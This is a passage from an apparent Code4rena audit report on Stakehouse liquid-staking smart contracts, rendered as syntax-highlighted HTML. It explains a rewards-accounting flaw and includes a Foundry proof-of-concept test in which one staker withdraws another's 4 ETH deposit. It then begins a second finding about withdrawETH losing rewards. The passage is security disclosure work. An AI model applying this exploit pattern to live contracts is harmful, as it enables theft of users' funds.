class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Calculate how much ETH rewards the address is owed / due </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">due</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">accumulatedETHPerLPShare</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PRECISION</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">due</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">due</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalClaimed</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">due</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">due</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to transfer&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ETHDistributed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">due</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>To ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a deposit <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123\">StakingFundsVault.sol#L123</a>).</p>\n<p>However, this rewards accounting algorithm also counts deposited tokens:</p>\n<ol>\n<li>to stake tokens, users call <code>depositETHForStaking</code> and send ETH (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L113\">StakingFundsVault.sol#L113</a>);</li>\n<li><code>updateAccumulatedETHPerLP</code> is called in the function (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123\">StakingFundsVault.sol#L123</a>);</li>\n<li><code>updateAccumulatedETHPerLP</code> checks the balance of the contract, which <em>already includes the new staked amount</em> (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L78\">SyndicateRewardsProcessor.sol#L78</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L94\">SyndicateRewardsProcessor.sol#L94</a>).</li>\n<li>the staked amount is then counted in the <code>accumulatedETHPerLPShare</code> variable (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85\">SyndicateRewardsProcessor.sol#L85</a>), which is used to calculate the reward amount per LP share (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61\">SyndicateRewardsProcessor.sol#L61</a>).</li>\n</ol>\n<p>This allows the following attack:</p>\n<ol>\n<li>a user stakes 4 ETH to a BLS key;</li>\n<li>the validator with the BLS key gets registered and its derivative tokens get minted;</li>\n<li>a new user stakes some amount to a different BLS key;</li>\n<li>the first user calls <code>claimRewards</code> and withdraws the stake of the new user.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// test/foundry/StakingFundsVault.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testStealingOfDepositsByOldStakers_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Resetting the mocks, we need real action.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">MockAccountManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">accountMan</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">setLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">MockAccountManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">accountMan</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">setLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">liquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setIsPartOfNetwork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">liquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setIsPartOfNetwork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Aliasing accounts for better readability.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountFour</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountThree</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Node runner registers two BLS keys.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">registerSingleBLSPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountFive</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">registerSingleBLSPubKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountFive</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Alice deposits to the MEV+fees vault of the first key.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">maxETHDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Someone else deposits to the savETH vault of the first key.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">liquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">savETHVault</span><span class=\"mtk1\">().</span><span class=\"mtk12\">depositETHForStaking</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The first validator is registered and the derivatives are minted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalShares</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">stakeAndMintDerivativesSingleKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalShares</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Warping to pass the lastInteractedTimestamp checks.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The first key cannot accept new deposits since the maximal amount was deposited</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// and the validator was register. The vault however can still be used to deposit to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// other keys.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Bob deposits to the MEV+fees vault of the second key.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">maxETHDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Alice is claiming rewards for the first key.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Notice that no rewards were distributed to the MEV+fees vault of the first key.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice2</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpTokenBLSPubKeyOne</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Alice has stolen the Bob&#39;s deposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpTokenBLSPubKeyOne</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice2</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpTokenBLSPubKeyOne</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider excluding newly staked amounts in the <code>accumulatedETHPerLPShare</code> calculations.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375#issuecomment-1329427565\">vince0656 (Stakehouse) confirmed duplicate issue #375</a></strong></p>\n<hr>\n<h2 id=\"h-19-withdraweth-in-giantpoolbase-dont-call-_distributeethrewardstouserfortoken-or-_onwithdraw-which-would-make-users-to-lose-their-remaining-rewards-\" style=\"position:relative;\"><a href=\"#h-19-withdraweth-in-giantpoolbase-dont-call-_distributeethrewardstouserfortoken-or-_onwithdraw-which-would-make-users-to-lose-their-remaining-rewards-\" aria-label=\"h 19 withdraweth in giantpoolbase dont call _distributeethrewardstouserfortoken or _onwithdraw which would make users to lose their remaining rewards  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260\">[H-19] <code>withdrawETH()</code> in GiantPoolBase don’t call <code>_distributeETHRewardsToUserForToken()</code> or <code>_onWithdraw()</code> which would make users to lose their remaining rewards </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/280\">0x4non</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193</a></p>\n<p>Function <code>_distributeETHRewardsToUserForToken()</code> is used to distribute remaining reward of user and it’s called in <code>_onWithdraw()</code> of <code>GiantMevAndFeesPool</code>. but function <code>withdrawETH()</code> in <code>GiantPoolBase</code> don’t call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>withdrawETH()</code> code in <code>GiantPoolBase</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _amount of LP tokens user is burning in exchange for same amount of ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function withdrawETH(uint256 _amount) external nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_amount &gt;= MIN_STAKING_AMOUNT, &quot;Invalid amount&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(lpTokenETH.balanceOf(msg.sender) &gt;= _amount, &quot;Invalid balance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(idleETH &gt;= _amount, &quot;Come back later or withdraw less ETH&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        idleETH -= _amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lpTokenETH.burn(msg.sender, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool success,) = msg.sender.call{value: _amount}(&quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(success, &quot;Failed to transfer ETH&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 